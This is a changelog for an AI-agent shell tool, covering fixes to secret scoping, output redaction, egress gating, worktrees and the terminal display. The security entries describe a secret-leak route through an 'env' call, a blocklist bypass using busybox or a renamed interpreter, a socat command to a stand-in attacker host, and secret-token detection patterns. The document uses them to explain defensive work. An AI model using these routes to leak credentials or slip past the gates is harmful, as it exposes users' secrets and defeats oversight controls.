- **`${profile:KEY}` secret resolution is scoped, deny-by-default, and audited** (PR #939, TASK-946 / SEC-3.1 / F-02): `resolve_env_value` resolved profile refs for *any* program with no scoping and no audit, so `run_program{program:"env", env:{X:"${profile:AWS_SECRET_ACCESS_KEY}"}}` printed the secret to stdout — landing it in model context, the transcript, and the DB, in direct contradiction of the system prompt's promise. New `src/secrets.rs` **inverts the check**: unknown binaries are refused too, and a secret reaches a binary only via `KNOWN_SECRET_CONSUMERS` or a per-session allowlist (a blocklist alone is bypassable via `/bin/busybox sh` or a renamed interpreter). Program names are normalised through wrapper-peel first, so `env X=${profile:K} sh -c …` classifies as `sh`. `:secrets` / `:secrets allow <KEY>` / `allow-program <bin>` / `deny <KEY>` drive a per-session `SecretPolicy`; in unattended/coordinator mode the allowed-key set defaults to **empty**. Every attempt — allowed *and* refused — is audited (timestamp, session, run, key **name**, profile, program, argv hash, outcome, value length) to `tracing` target `aish::secrets` and a `secret_audit` table with a 90-day prune. The value never appears in any form, not even hashed (a hash of a short secret is brute-forceable). Also fixes the parse so `tools.rs` agrees with `mcp.rs` that `profile:` is a fixed prefix.
- **Central secret-redaction filter for captured output** (PR #933, TASK-947 / SEC-3.2 / F-02): new `src/redact.rs` scrubs secrets out of captured program output **before** it reaches the model, the transcript, or the SQLite history DB. A process-wide `Redactor` registry (rejecting values under 8 chars and a low-entropy deny set) is paired with token patterns for GitHub classic + fine-grained PATs, AWS `AKIA`/`ASIA` keys, `sk-ant`, `sk-`, Slack `xox*`, Google `AIza`, Stripe `sk_live`/`rk_live`, JWTs, PEM private-key blocks, bearer/authorization headers, and DB connection URLs with inline credentials. `scrub()` takes a zero-copy `Cow::Borrowed` fast path behind a `RegexSet` pre-filter, and the one unbounded pattern (PEM) is guarded by a literal `-----BEGIN` pre-check so hostile input cannot trigger catastrophic backtracking. Scrubbing happens **before** head/tail truncation so a secret cannot survive by straddling the truncation boundary; file reads are scrubbed only for sensitive paths, so ordinary source files come back byte-identical. Replacements are visible and labelled `[redacted:<label>]`. `:redact off` is a session-local escape valve, refused in unattended/coordinator mode.
- **Opt-in GC for provably-safe leaked worktrees, plus a disk-pressure warning** (PR #940): measured on a live box, `~/.aish/worktrees` had grown to **96 GB** across 51 live trees while the lifecycle ledger held 91 still-open rows with zero cleanup failures — the tell that cleanup was never *attempted*, not failing. The existing sweep deliberately never deletes (an operator's unmerged branch is exactly what's at stake), which left no way to reclaim the space. `:worktrees gc` is a **dry run by default**, listing what would be removed and every skip with its reason; `--apply` is required to remove anything. All safety gates must hold — ledger row open and older than 24 h, tree clean per `worktree_holds_work`, branch an ancestor of trunk — and **anything unanswerable skips as unknown**. Nothing is automatic: no startup sweep, no env flag that enables one. Separately, creating an isolated worker tree while the root exceeds a threshold (20 GiB default, `AISH_WORKTREE_PRESSURE_GIB`) emits one dim stderr line pointing at `:worktrees gc` — bounded, best-effort, and unable to block or sink a worker spawn.
- **Worker branches get readable names derived from the task brief** (PR #945): background-worker branches were `aish/w_########` — opaque in `git branch -r`, in PR lists, and in `gh pr view --json headRefName`. The branch is now slugged from the task brief (or the Atum card title when the dispatch came from a card), keeping a conventional-commit prefix, capped at 48 chars on a `-` boundary, with the worker id appended so two similar briefs can never collide: `aish/fix-ticker-bound-the-mid-turn-erase-w_lu79F23J`. Worktree **paths** are deliberately unchanged, so discovery, cleanup, and existing on-disk dirs keep working, and an unusable brief falls back to exactly today's `aish/{id}`.

### Changed
- **`read_file` degrades an oversize unranged read instead of refusing it** (PR #937): `read_file` is the worst tool in aish's telemetry — 25,425 calls / 2,685 errors (10.6%), and the TASK-322 "bulk reads without line bounds are disallowed" rejection alone accounts for **58.4% of every tool error ever logged**. 83% of those rejections succeeded on an immediate re-read of the *same* file *with* bounds, so the hard `Err` cost a full model round-trip (whole prompt re-sent) to teach a lesson the response could have taught while also returning useful data. The guard now returns `Ok` with a head slice (first `min(total, 200)` lines, additionally byte-bounded so few-but-enormous lines can't smuggle a bulk read through) under the same `[lines A-B of TOTAL]` header, followed by a delimited `--- TRUNCATED: … ---` notice carrying total bytes, total lines, lines shown, and a concrete `line_start`/`line_end` for the next chunk. The discipline is preserved — the response still states unmistakably that the call was wrong — only the `Err`→`Ok` shape moved. Explicit-range reads, at-or-under-cap whole-file reads, and the `line_end < line_start` validation error are unchanged.

### Fixed
- **Ticker erase no longer wipes the footer** (PR #935): the v0.53.2 ticker erased its painted window with an anchor-relative `CSI {painted} F` + `CSI 0 J`. Erase-in-display is **not** bounded by the DECSTBM scroll region, so every repaint erased from the anchor row to the end of the *screen* — taking the bottom-anchored footer with it (separator, status message, statusline, and the escalation/queued tray), which read as "the statusline keeps disappearing while output streams". It is replaced with a bounded row walk (`CSI 1 F` + `CSI 2 K` per row), which touches exactly the rows the window owns; it walks **up** on purpose, since CPL saturates at the top margin so an over-large count harmlessly re-erases the top row instead of marching back down into the footer. `render_raw_toggle` shared the same ED bug and now shares the bounded helper. A regression test asserts no ED sequence is ever emitted.
- **`thinking…` no longer paints on top of a pinned escalation banner** (PR #947, PR #946): when a banner pinned mid-turn the footer grew and `body_bottom` moved up, but nothing moved the cursor — it was left sitting inside the rows the tray had just claimed, so the next body write (most visibly the in-place animated `thinking…` row) painted straight onto the banner, and footer repaint and spinner then fought over the same cells. The body is now scrolled up by exactly the rows the footer takes, with line feeds issued while the *old* taller region is still installed so the lifted rows reach native scrollback, and the cursor walked back with CUU. The companion fix keeps the tray **ticking**: the heartbeat gate no longer vetoes on `ATTACH_ACTIVE` (the attach view renders on the primary buffer, so the tray is on screen and must keep advancing), and a pre-paint hook refreshes each pinned banner's status row from the live worker/coordinator state rather than only the cached frame. A new `FOOTER_PAINT` mutex serialises the only two writers that move the body/footer boundary, so a heartbeat paint can no longer land between the store mutation and the line feeds and scroll inside an already-shrunk body.
- **Coordinator salvage stops false-positiving on known worktrees** (PR #938): the salvage sweep minted salvage rows for trees that a real run demonstrably owned — 21 of the 22 salvage rows minted since `worktree_lifecycle` existed had a ledger row for that exact id. Salvage now also consults `worktree_lifecycle`, which is written once at `git worktree add` and never deleted, making it durable proof of ownership; it fires only when work exists and **nothing** durable claims the tree, so a genuinely lost tree is still salvaged and announced. A ledger read error falls back to the old row-only behaviour rather than disabling the backstop.
- **Egress gate stops false-positiving on local `openssl` and on listeners** (PR #932, follow-up): `openssl` was classified as egress wholesale, but only `s_client`/`s_server`/`s_time`/`ocsp`/`ts` open a socket — local crypto (`rand`, `dgst`, `genrsa`, `enc`, `x509`) ran ~14:1 false-positive and was hard-refused inside coordinators, breaking nested HMAC/keygen flows. Bare `openssl` still classifies, so the gate fails safe. `nc -l 9000` / `socat TCP-LISTEN:9000` are **inbound** — they bind a local port and have no destination — yet the prompt read "would SEND DATA to: 9000", handing a port number to the gate as a hostname; listeners are now exempt with a bare-port backstop. socat's `-l*` short flags are logging selectors rather than listen mode, so socat is matched on its address family only and `socat -lf log TCP:evil.com:80` stays gated.
- **`:workers` runs immediately mid-turn instead of being queued**: typing `:workers` while a turn was in flight queued it as type-ahead, so the listing you asked for rendered only after the turn ended — describing a different, already-moved-on world, which is the opposite of what you wanted when you asked *while* work was running. `workers` joins `dispatch` / `tell` / `stop` on the `midturn_input::runs_immediately` whitelist and is served from the same `OpsCtx` snapshot via `repl::workers_listing_ctx`, so the mid-turn table is byte-identical to the at-the-prompt one. The old exclusion rationale (it "opens a keyboard modal that would steal stdin from the classifying reader thread") never applied: `handle_colon` already gates the modal behind `!keywatch::installed()`, and keywatch owns stdin for the whole turn, so the mid-turn path is always the static table. `:workers diagram` (and its `states` / `lifecycle` aliases) is likewise immediate; `:jobs` and `:status` stay queued.
- **Statusline stops disappearing while the model is thinking** (PR #944): the footer heartbeat — the background thread that repaints the statusline from cache to heal a footer that scrolled out of view — only ran while the REPL was parked at the prompt (`READING_LINE`). For the whole duration of a turn (thinking + tool calls, often minutes) nothing repainted the footer, so anything that scrolled it away or overwrote it during that window left it gone until the turn ENDED: a mouse-wheel/trackpad scroll (which sends aish no input at all, so the shell never learns the viewport moved), a window resize leaving DECSTBM stale, or a full-screen program's leftovers. The `READING_LINE` requirement was never a safety property — the repaint is cursor-safe (DECSC/DECRC) and mid-turn type-ahead lives in `MIDTURN_INPUT`, which the repaint itself draws. The one genuine hazard, rustyline rendering a partially-typed line (`INPUT_DIRTY`), is now scoped to the prompt instead of blocking unconditionally, so the heartbeat keeps healing the footer straight through a turn. The gate is extracted as a pure `heartbeat_should_paint(HeartbeatState)` with regression tests covering mid-turn healing, resize/animation bypasses, the in-progress-prompt-line hold-off, `:attach` and foreground-TTY-child (`vim`/`sudo`) yielding, and the no-change quiet case.
- **The three remaining mid-edit interruption windows are closed** (PR #950, GH#734): a background worker finishing while you were mid-keystroke could still submit a half-typed line or clobber the prompt. `LineEditGuard` + the interruptible poll read already deferred a coordinator's TIOCSTI nudge while you type, but only on the **interruptible idle read** and only for an **in-session** producer, which left three leaks: the plain blocking `readline` (used for non-tty, nothing-outstanding, or raw-mode setup failure) had **no poll window at all**, so it could never observe the resume wake nor tell "idle at an empty prompt" from "mid-keystroke"; `readline_with_initial` treated a pre-filled buffer as not-yet-a-line even though a restored draft is in flight from the first instant, so a finish submitted it truncated; and a tailed **off-process durable** coordinator raised the same wake but was counted by neither `outstanding_workers` nor `session.attached`, so tailing one fell through to the plain read. Both reads now hold the guard for their whole duration, and the gate is factored out as a pure `editor::should_poll_idle_read(outstanding_workers, attached_to_worker, attached_to_durable)` — same testability pattern as `interrupt_outcome` / `should_nudge` — so the OR can no longer silently lose a producer. Truly idle sessions (`0, false, false`) keep the plain blocking read, leaving the common path unchanged.

### Fixed
- **Footer ate a command's last lines on resume** (PR #829): returning to the prompt after a long-running command could repaint the status footer over the tail of that command's output, permanently clobbering the last lines a user needed to read. `src/terminal.rs` now restores the scroll region and reserves the footer row before resuming output.

- **Installed Status Display in `:skill search`**: Search results now show a green `✓ installed` indicator for skills already in your local `~/.aish/skills` directory, making it easy to see what's installed vs available
- **Exponential Backoff Retry for mcpmarket Bot Protection**: When Vercel's bot challenge (HTTP 429) blocks mcpmarket.com access, aish now retries with exponential backoff (1s, 2s, 4s delays), matching skillfish's behavior
- Debug logging for skill search retry attempts and responses

### Fixed
- Graceful fallback to embedded offline skill catalog when mcpmarket is unavailable or returns transient errors

### Changed
- Enhanced `:skill search` table layout with clearer column organization
